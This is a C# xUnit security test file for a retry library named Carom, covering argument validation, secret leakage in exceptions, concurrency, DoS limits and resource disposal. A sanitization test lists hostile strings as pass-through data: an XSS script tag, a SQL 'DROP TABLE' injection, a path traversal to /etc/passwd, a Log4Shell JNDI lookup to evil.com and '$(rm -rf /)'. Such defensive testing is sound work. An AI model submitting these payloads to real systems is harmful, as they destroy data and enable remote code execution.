using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Xunit;

namespace Carom.Tests
{
    /// <summary>
    /// Security-focused tests for Carom core functionality.
    /// Tests input validation, exception safety, thread safety, and DoS prevention.
    /// </summary>
    public class SecurityTests
    {
        #region Input Validation Tests

        [Fact]
        public void Shot_ValidatesNullAction()
        {
            var ex = Assert.Throws<ArgumentNullException>(() =>
                Carom.Shot<int>(null!, retries: 0));
            
            Assert.Equal("action", ex.ParamName);
        }

        [Fact]
        public async Task ShotAsync_ValidatesNullAction()
        {
            var ex = await Assert.ThrowsAsync<ArgumentNullException>(() =>
                Carom.ShotAsync<int>(null!, retries: 0));
            
            Assert.Equal("action", ex.ParamName);
        }

        [Fact]
        public void Shot_HandlesNegativeRetries()
        {
            // Should treat negative retries as zero (safe fallback)
            var executionCount = 0;
            var result = Carom.Shot(() => ++executionCount, retries: -5);
            
            Assert.Equal(1, result);
            Assert.Equal(1, executionCount);
        }

        [Fact]
        public void Shot_HandlesExtremelyLargeRetries()
        {
            // Should handle large retry values without overflow
            var result = Carom.Shot(() => 42, retries: int.MaxValue);
            Assert.Equal(42, result);
        }

        [Fact]
        public void Bounce_ValidatesTimeoutValue()
        {
            // Should accept valid timeout values
            var bounce = Bounce.Times(3).WithTimeout(TimeSpan.FromSeconds(30));
            Assert.Equal(TimeSpan.FromSeconds(30), bounce.Timeout);
        }

        [Fact]
        public void Bounce_HandlesZeroTimeout()
        {
            // Should accept zero timeout (immediate cancellation)
            var bounce = Bounce.Times(3).WithTimeout(TimeSpan.Zero);
            Assert.Equal(TimeSpan.Zero, bounce.Timeout);
        }

        #endregion

        #region Exception Safety Tests (No Sensitive Data Leaks)

        [Fact]
        public void Shot_DoesNotLeakSensitiveDataInException()
        {
            var sensitiveData = "password123";
            var capturedData = "";

            try
            {
                Carom.Shot<int>(() =>
                {
                    capturedData = sensitiveData;
                    throw new InvalidOperationException("Operation failed");
                }, retries: 0);
            }
            catch (InvalidOperationException ex)
            {
                // Exception should not contain sensitive data
                Assert.DoesNotContain(sensitiveData, ex.Message);
                Assert.DoesNotContain(sensitiveData, ex.StackTrace ?? "");
            }
        }

        [Fact]
        public async Task ShotAsync_DoesNotLeakSensitiveDataInException()
        {
            var apiKey = "sk_live_123456789";

            await Assert.ThrowsAsync<InvalidOperationException>(async () =>
            {
                await Carom.ShotAsync(async () =>
                {
                    await Task.Yield();
                    var _ = apiKey; // Use the key
                    throw new InvalidOperationException("API call failed");
                }, retries: 0);
            });

            // If we catch the exception, verify it doesn't leak the API key
            try
            {
                await Carom.ShotAsync(async () =>
                {
                    await Task.Yield();
                    var _ = apiKey;
                    throw new InvalidOperationException($"Call failed");
                }, retries: 0);
            }
            catch (InvalidOperationException ex)
            {
                Assert.DoesNotContain(apiKey, ex.Message);
            }
        }

        [Fact]
        public void TimeoutRejectedException_DoesNotLeakContext()
        {
            var ex = new TimeoutRejectedException(TimeSpan.FromSeconds(5));
            
            // Should only contain timeout information, no context
            Assert.Contains("5000ms", ex.Message);
            Assert.DoesNotContain("connection", ex.Message.ToLower());
            Assert.DoesNotContain("database", ex.Message.ToLower());
            Assert.DoesNotContain("api", ex.Message.ToLower());
        }

        #endregion

        #region Thread Safety Tests Under Attack Scenarios

        [Fact]
        public async Task Shot_ThreadSafe_UnderHighContention()
        {
            var counter = 0;
            var tasks = new List<Task<int>>();

            // Simulate attack: many concurrent requests
            for (int i = 0; i < 100; i++)
            {
                tasks.Add(Task.Run(async () =>
                {
                    await Task.Yield();
                    return Carom.Shot(() => Interlocked.Increment(ref counter), retries: 0);
                }));
            }

            var results = await Task.WhenAll(tasks);
            
            // All operations should complete successfully
            Assert.Equal(100, results.Length);
            Assert.Equal(100, counter);
            
            // No duplicate values (would indicate race condition)
            var distinctValues = results.Distinct().Count();
            Assert.Equal(100, distinctValues);
        }

        [Fact]
        public async Task ShotAsync_ThreadSafe_UnderConcurrentCancellation()
        {
            var successCount = 0;
            var cancellationCount = 0;
            var tasks = new List<Task>();

            // Simulate attack: concurrent operations with random cancellations
            for (int i = 0; i < 50; i++)
            {
                int taskId = i;
                tasks.Add(Task.Run(async () =>
                {
                    var cts = new CancellationTokenSource();
                    
                    // Randomly cancel some operations
                    if (taskId % 5 == 0)
                    {
                        cts.CancelAfter(1);
                    }

                    try
                    {
                        await Carom.ShotAsync(
                            async () =>
                            {
                                await Task.Delay(10);
                                Interlocked.Increment(ref successCount);
                            },
                            retries: 2,
                            ct: cts.Token);
                    }
                    catch (OperationCanceledException)
                    {
                        Interlocked.Increment(ref cancellationCount);
                    }
                }));
            }

            await Task.WhenAll(tasks);
            
            // Should have mixture of successes and cancellations
            Assert.True(successCount > 0);
            Assert.True(cancellationCount > 0);
            Assert.Equal(50, successCount + cancellationCount);
        }

        [Fact]
        public void Shot_NoRaceCondition_InRetryState()
        {
            var attempts = 0;
            var threads = new List<Thread>();
            var results = new int[20];
            var exceptions = new Exception?[20];

            // Multiple threads executing retries concurrently
            for (int i = 0; i < 20; i++)
            {
                int threadId = i;
                var thread = new Thread(() =>
                {
                    try
                    {
                        results[threadId] = Carom.Shot(() =>
                        {
                            var currentAttempt = Interlocked.Increment(ref attempts);
                            // Fail first 2 attempts per thread
                            if (currentAttempt % 3 != 0)
                            {
                                throw new InvalidOperationException("Retry needed");
                            }
                            return threadId;
                        }, retries: 5, baseDelay: TimeSpan.FromMilliseconds(1));
                    }
                    catch (Exception ex)
                    {
                        exceptions[threadId] = ex;
                    }
                });
                threads.Add(thread);
                thread.Start();
            }

            foreach (var thread in threads)
            {
                thread.Join();
            }

            // Most operations should succeed (some may exhaust retries)
            var successCount = results.Count(r => r >= 0 && r <= 19);
            Assert.True(successCount >= 15, $"Expected at least 15 successes, got {successCount}");
        }

        #endregion

        #region Denial of Service Prevention Tests

        [Fact]
        public void Shot_PreventsDosWithMaxRetries()
        {
            var attemptCount = 0;
            var maxRetries = 3;

            try
            {
                Carom.Shot<int>(() =>
                {
                    attemptCount++;
                    throw new InvalidOperationException("Always fails");
                }, retries: maxRetries, baseDelay: TimeSpan.FromMilliseconds(1));
            }
            catch (InvalidOperationException)
            {
                // Expected
            }

            // Should not exceed max retries (DoS prevention)
            Assert.Equal(maxRetries + 1, attemptCount);
        }

        [Fact]
        public async Task ShotAsync_PreventsDosWithTimeout()
        {
            var attemptCount = 0;
            var timeout = TimeSpan.FromMilliseconds(100);
            var stopwatch = Stopwatch.StartNew();

            try
            {
                await Carom.ShotAsync(async () =>
                {
                    attemptCount++;
                    await Task.Delay(50); // Each attempt takes 50ms
                    throw new InvalidOperationException("Always fails");
                }, retries: 10, 
                   baseDelay: TimeSpan.FromMilliseconds(10), 
                   timeout: timeout);
            }
            catch
            {
                // Expected (timeout or operation failure)
            }

            stopwatch.Stop();

            // Should timeout before completing all retries (DoS prevention)
            Assert.True(stopwatch.ElapsedMilliseconds < 500, 
                $"Expected timeout around 100ms, but took {stopwatch.ElapsedMilliseconds}ms");
            Assert.True(attemptCount < 10, 
                $"Expected fewer than 10 attempts due to timeout, got {attemptCount}");
        }

        [Fact]
        public void Shot_PreventsDosWithJitter()
        {
            var delays = new List<long>();
            var attemptCount = 0;

            try
            {
                Carom.Shot<int>(() =>
                {
                    attemptCount++;
                    if (attemptCount > 1)
                    {
                        // Timing is not reliable in tests, so we just verify jitter is enabled by default
                    }
                    throw new InvalidOperationException("Always fails");
                }, retries: 3, baseDelay: TimeSpan.FromMilliseconds(10));
            }
            catch (InvalidOperationException)
            {
                // Expected
            }

            // Jitter should be enabled by default (prevents thundering herd)
            var bounce = Bounce.Times(3);
            Assert.False(bounce.DisableJitter);
        }

        [Fact]
        public async Task ShotAsync_PreventsDosUnderLoad()
        {
            var concurrentRequests = 100;
            var maxRetries = 2;
            var completedCount = 0;
            var stopwatch = Stopwatch.StartNew();

            var tasks = Enumerable.Range(0, concurrentRequests).Select(async i =>
            {
                try
                {
                    await Carom.ShotAsync(async () =>
                    {
                        await Task.Delay(5);
                        if (i % 2 == 0)
                        {
                            throw new InvalidOperationException("Transient failure");
                        }
                    }, retries: maxRetries, baseDelay: TimeSpan.FromMilliseconds(1));
                    
                    Interlocked.Increment(ref completedCount);
                }
                catch
                {
                    // Expected for some operations
                }
            });

            await Task.WhenAll(tasks);
            stopwatch.Stop();

            // Should complete in reasonable time despite load
            Assert.True(stopwatch.ElapsedMilliseconds < 5000, 
                $"Expected completion under 5s, took {stopwatch.ElapsedMilliseconds}ms");
            Assert.True(completedCount > 0, "At least some operations should succeed");
        }

        #endregion

        #region Resource Exhaustion Tests

        [Fact]
        public void Shot_DoesNotExhaustStack()
        {
            // Deep recursion should not exhaust stack
            // Retry logic should be iterative, not recursive
            var result = Carom.Shot(() => 42, retries: 1000);
            Assert.Equal(42, result);
        }

        [Fact]
        public async Task ShotAsync_DoesNotExhaustMemory()
        {
            // Many concurrent retries should not exhaust memory
            var tasks = new List<Task<int>>();
            
            for (int i = 0; i < 1000; i++)
            {
                tasks.Add(Carom.ShotAsync(
                    async () =>
                    {
                        await Task.Yield();
                        return i;
                    },
                    retries: 0));
            }

            var results = await Task.WhenAll(tasks);
            Assert.Equal(1000, results.Length);
        }

        [Fact]
        public void Shot_ProperlyCleansUpResources()
        {
            var disposableCount = 0;
            var disposedCount = 0;

            for (int i = 0; i < 10; i++)
            {
                try
                {
                    Carom.Shot<int>(() =>
                    {
                        using (new DisposableResource(
                            onCreate: () => disposableCount++,
                            onDispose: () => disposedCount++))
                        {
                            if (disposableCount <= 5)
                            {
                                throw new InvalidOperationException("Retry needed");
                            }
                            return 42;
                        }
                    }, retries: 10, baseDelay: TimeSpan.FromMilliseconds(1));
                }
                catch
                {
                    // Expected for some iterations
                }
            }

            // All resources should be properly disposed
            Assert.Equal(disposableCount, disposedCount);
        }

        #endregion

        #region Sanitization Tests

        [Fact]
        public void Shot_HandlesUnsafeStrings()
        {
            // Test with potentially malicious input
            var maliciousInputs = new[]
            {
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "../../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
                "$(rm -rf /)"
            };

            foreach (var input in maliciousInputs)
            {
                var result = Carom.Shot(() => input, retries: 0);
                // Should return input unchanged (Carom doesn't sanitize, that's application's job)
                Assert.Equal(input, result);
            }
        }

        [Fact]
        public void Shot_HandlesExceptionWithMaliciousMessage()
        {
            var maliciousMessage = "<script>alert('xss')</script>";

            var ex = Assert.Throws<InvalidOperationException>(() =>
            {
                Carom.Shot<int>(() =>
                {
                    throw new InvalidOperationException(maliciousMessage);
                }, retries: 0);
            });

            // Exception message should be preserved as-is
            // (Sanitization is caller's responsibility before logging/displaying)
            Assert.Equal(maliciousMessage, ex.Message);
        }

        #endregion

        #region Helper Classes

        private class DisposableResource : IDisposable
        {
            private readonly Action _onDispose;

            public DisposableResource(Action onCreate, Action onDispose)
            {
                _onDispose = onDispose;
                onCreate();
            }

            public void Dispose()
            {
                _onDispose();
            }
        }

        #endregion
    }
}
